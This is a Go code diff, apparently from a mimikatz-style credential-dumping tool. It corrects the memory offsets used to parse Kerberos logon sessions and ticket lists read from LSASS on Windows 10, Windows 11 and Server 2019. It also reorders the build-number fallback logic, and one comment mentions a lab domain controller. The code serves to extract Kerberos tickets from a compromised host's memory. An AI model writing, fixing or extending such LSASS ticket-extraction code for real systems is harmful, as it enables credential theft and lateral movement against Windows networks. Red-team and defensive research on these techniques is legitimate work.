@@ -161,19 +161,18 @@ type kerbSessionLayout struct {
 var kerbSessionLayouts = []kerbSessionLayout{
 	{
 		// Server 2019 (build 17763) / Win10 1809+ / Win11
-		// KIWI_KERBEROS_LOGON_SESSION_10_1607_X — has 0x18 extra bytes before
-		// the credential fields (LUID shifts 0x48→0x60, UserName 0x88→0xA0).
-		// But ticket list offsets remain at the SAME position as Win10_1607
-		// (0xF8/0x108/0x118). Validated against GOAD DC01 S437 hex dump.
+		// KIWI_KERBEROS_LOGON_SESSION_10_1607_X — has 0x18 extra bytes vs
+		// the base 1607 layout. ALL offsets shift by 0x18: LUID 0x48→0x60,
+		// UserName 0x88→0xA0, Tickets1 0xF8→0x110, etc.
 		Name:         "Win10_1809_Win11",
 		ListEntryOff: 0x08,
 		LUIDOff:      0x60,
 		UserNameOff:  0xA0,
 		DomainOff:    0xB0,
-		Tickets1Off:  0xF8,
-		Tickets2Off:  0x108,
-		Tickets3Off:  0x118,
-		NodeReadSize: 0x130,
+		Tickets1Off:  0x110,
+		Tickets2Off:  0x120,
+		Tickets3Off:  0x130,
+		NodeReadSize: 0x148,
 	},
 	{
 		// Win10 1607-1803 / Server 2016 (KIWI_KERBEROS_LOGON_SESSION_10_1607)
@@ -698,14 +697,14 @@ func extractKerbTickets(r lsassReader, sessionRaw []byte, sessionBase uintptr, s
 }
 
 // selectKerbLayouts returns the best session and ticket layouts for the given
-// Windows build number. Falls back to the newest layout if build is unknown.
+// Windows build number. Falls back to the newest layout if build is unknown (0).
 func selectKerbLayouts(buildNumber uint32) (kerbSessionLayout, kerbTicketLayout) {
 	if buildNumber > 0 && buildNumber < 14393 {
 		return kerbSessionLayouts[2], kerbTicketLayouts[1] // Win10 1507
 	}
-	if buildNumber >= 17763 {
-		return kerbSessionLayouts[0], kerbTicketLayouts[0] // Server 2019+ / Win10 1809+
+	if buildNumber > 0 && buildNumber < 17763 {
+		return kerbSessionLayouts[1], kerbTicketLayouts[0] // Win10 1607-1803
 	}
-	return kerbSessionLayouts[1], kerbTicketLayouts[0] // Win10 1607-1803
+	return kerbSessionLayouts[0], kerbTicketLayouts[0] // Server 2019+ / Win10 1809+ (default)
 }
 
